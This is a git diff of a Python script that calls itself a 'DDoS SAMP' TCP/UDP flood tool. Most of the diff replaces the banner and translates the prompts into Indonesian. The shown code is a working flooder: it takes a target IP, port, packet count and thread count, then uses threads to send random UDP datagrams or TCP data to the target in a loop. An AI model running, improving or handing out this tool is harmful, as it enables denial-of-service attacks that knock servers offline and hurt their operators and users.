@@ -5,21 +5,22 @@ import random
 import socket
 import threading
 
-print       (" - - > SPECIAL THANKS TO Leeon123 < - - ")
-print       (" - - > DONT ABUSE THIS TOOLS !!!! < - - ")
-print       (" - - > MY DISCORD? XTraylinz#0965 <- - ")                                   
-print       (" - - > JIKA BUTUH BANTUAN LEBIH LANJUT BISA PM DISCORD SAYA < - - ")
-print       (" - - > JOIN COMMUNITY LINK DIBAWAH < - - ")
-print       (" - - > https://discord.gg/nWDNdZRtBa < - - ")
-print       (" - - > BUAT YANG MAU BELAJAR LEBIH, JOIN SKUY < - - ")
+print       (" - - > 
+██████╗░██████╗░░█████╗░░██████╗  ░██████╗░█████╗░███╗░░░███╗██████╗░
+██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔════╝██╔══██╗████╗░████║██╔══██╗
+██║░░██║██║░░██║██║░░██║╚█████╗░  ╚█████╗░███████║██╔████╔██║██████╔╝
+██║░░██║██║░░██║██║░░██║░╚═══██╗  ░╚═══██╗██╔══██║██║╚██╔╝██║██╔═══╝░
+██████╔╝██████╔╝╚█████╔╝██████╔╝  ██████╔╝██║░░██║██║░╚═╝░██║██║░░░░░
+╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░ < - - ")
 
-print("--> CODED BY TRAYLINZ <--")
+
+print("--> DDoS SAMP <--")
 print("#-- TCP/UDP FLOOD --#")
-ip = str(input(" Host/Ip:"))
-port = int(input(" Port:"))
+ip = str(input(" IP:"))
+port = int(input(" PORT:"))
 choice = str(input(" UDP(y/n):"))
-times = int(input(" Packets per one connection:"))
-threads = int(input(" Threads:"))
+times = int(input(" PAKET YANG MAU DI KIRIM:"))
+threads = int(input(" THREADS:"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -29,9 +30,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" PUNTEN PAKET!!")
 		except:
-			print("[!] Error!!!")
+			print("[!] GAGAL!!!")
 
 def run2():
 	data = random._urandom(16)
@@ -43,10 +44,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" PUNTEN PAKET!!")
 		except:
 			s.close()
-			print("[*] Error")
+			print("[*] GAGAL")
 
 for y in range(threads):
 	if choice == 'y':
